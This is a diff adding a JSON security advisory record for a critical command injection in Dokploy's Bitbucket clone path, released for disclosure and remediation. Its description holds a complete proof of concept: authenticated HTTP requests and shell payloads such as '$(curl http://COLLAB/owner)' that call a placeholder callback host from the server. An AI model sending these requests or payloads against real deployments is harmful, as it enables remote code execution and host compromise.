@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-grrj-6xrh-j6vp",
+  "repo": {
+    "cve_id": "CVE-2026-72872",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "| | |\r\n|---|---|\r\n| **Affected version** | v0.29.8 (commit `e9a0932b2`) |\r\n| **Component** | `@dokploy/server` - Bitbucket git provider clone |\r\n| **Authentication** | Authenticated; low-privilege `member` with service deploy permission |\r\n| **Status** | Confirmed via out-of-band code execution (Burp Collaborator) - both fields |\r\n\r\n## 1. Summary\r\nAn application bound to a Bitbucket git provider stores `bitbucketOwner` and `bitbucketRepository`\r\nwithout validation. At deploy time both are interpolated **unquoted** into the `git clone` URL/command\r\nexecuted via `/bin/sh -c`. An authenticated user achieves OS command execution on the Dokploy host /\r\ntarget server. Unlike the GitHub/GitLab/Gitea providers (which perform a live token fetch before\r\nbuilding the clone string and thus require a working integration), the **Bitbucket** clone builder\r\nmakes no upstream API call - it builds the command directly from stored credentials - so the sink is\r\nreachable with attacker-supplied dummy provider credentials.\r\n\r\n## 2. Affected code\r\n- **Sink** - `packages/server/src/utils/providers/bitbucket.ts:125-128`\r\n  ```js\r\n  const repoclone = `bitbucket.org/${bitbucketOwner}/${repoToUse}.git`;     // repoToUse = bitbucketRepositorySlug || bitbucketRepository\r\n  const cloneUrl = getBitbucketCloneUrl(bitbucket, repoclone);              // https://user:pass@<repoclone>\r\n  command += `echo \"Cloning Repo ${repoclone} ...\"`;                        // $() expands inside the double quotes\r\n  command += `git clone --branch ${bitbucketBranch} ... ${cloneUrl} ${outputPath} --progress;`;  // unquoted\r\n  ```\r\n  `getBitbucketCloneUrl` (`bitbucket.ts:44-49`) only reads the stored `bitbucketUsername`/`appPassword`\r\n  - **no network/API call** precedes the interpolation.\r\n- **Execution** - `services/application.ts:212-217` via `execAsync` / `execAsyncRemote` (`/bin/sh -c`).\r\n- **Entry point (no validation)** - `application.saveBitbucketProvider`\r\n  (`apps/dokploy/server/api/routers/application.ts:473`) writes `bitbucketOwner` / `bitbucketRepository`\r\n  verbatim; `apiSaveBitbucketProvider` (`db/schema/application.ts:471`) has no content regex on either.\r\n- The provider is created by `bitbucket.create` (`routers/bitbucket.ts:27`); `createBitbucket`\r\n  (`services/bitbucket.ts:14`) accepts arbitrary `bitbucketUsername`/`appPassword` and ignores `authId`.\r\n\r\n## 3. Authorization / reachability\r\n`bitbucket.create` requires the `gitProviders:create` permission; `saveBitbucketProvider` + `deploy`\r\nare gated only by `checkServicePermissionAndAccess` (no resource/org check for owner/admin). Reachable\r\nby a `member` with service write+deploy, and cross-tenant by an owner/admin of another organization.\r\n\r\n## 4. Proof of Concept (Burp)\r\n**Step 0 - Authenticate** (Appendix A). **Step 1 - Create a project + application** → `APP_ID`.\r\n\r\n**Step 2 - Create a Bitbucket provider with dummy credentials:**\r\n```http\r\nPOST /api/trpc/bitbucket.create?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"name\":\"poc\",\"authId\":\"x\",\"bitbucketUsername\":\"u\",\"appPassword\":\"p\"}}}\r\n```\r\nThen read the new `bitbucketId` (and its `gitProviderId`) via:\r\n```http\r\nGET /api/trpc/bitbucket.bitbucketProviders?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%2C%22meta%22%3A%7B%22values%22%3A%5B%22undefined%22%5D%7D%7D%7D HTTP/1.1\r\nHost: TARGET\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n```\r\n\r\n**Step 3 - Bind the app to the provider with payloads in BOTH fields:**\r\n```http\r\nPOST /api/trpc/application.saveBitbucketProvider?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"applicationId\":\"APP_ID\",\"bitbucketId\":\"BITBUCKET_ID\",\"bitbucketOwner\":\"o$(curl http://COLLAB/owner)\",\"bitbucketRepository\":\"r$(curl http://COLLAB/repo)\",\"bitbucketRepositorySlug\":\"\",\"bitbucketBranch\":\"main\",\"bitbucketBuildPath\":\"/\",\"watchPaths\":[],\"enableSubmodules\":false}}}\r\n```\r\n(Leaving `bitbucketRepositorySlug` empty makes `repoToUse` fall back to `bitbucketRepository`.)\r\n\r\n**Step 4 - Deploy:**\r\n```http\r\nPOST /api/trpc/application.deploy?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"applicationId\":\"APP_ID\"}}}\r\n```\r\n\r\n**Step 5 - Observe.** The Collaborator receives **two** HTTP requests - `GET /owner` and `GET /repo`,\r\nboth `User-Agent: curl/8.18.0`, from the Dokploy host - confirming both fields execute via `/bin/sh -c`.\r\n\r\n## 5. Impact\r\nArbitrary OS command execution as the Dokploy server process (host compromise) or on the target server\r\n(`serverId`). Cross-tenant when abused by an owner/admin of another organization.\r\n\r\n## 6. Remediation\r\n- Validate `bitbucketOwner`/`bitbucketRepository` (and the GitHub/GitLab/Gitea equivalents) against a\r\n  repo-name allow-list (`^[A-Za-z0-9._-]+$`); reject metacharacters.\r\n- Build the clone with `execFile`/`spawn` argument arrays instead of an interpolated shell string.\r\n- Validate provider credentials and enforce tenant isolation in the access helper.\r\n\r\n## Appendix A - Authentication\r\n```http\r\nPOST /api/auth/sign-in/email HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"email\":\"USER@EXAMPLE.COM\",\"password\":\"PASSWORD\"}\r\n```",
+    "ghsa_id": "GHSA-grrj-6xrh-j6vp",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-grrj-6xrh-j6vp",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-grrj-6xrh-j6vp"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72872"
+      }
+    ],
+    "published_at": "2026-07-21T23:24:15Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "OS Command Injection via Bitbucket `owner`/`repository` in `git clone`",
+    "updated_at": "2026-08-10T18:49:22Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "< 0.29.8 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
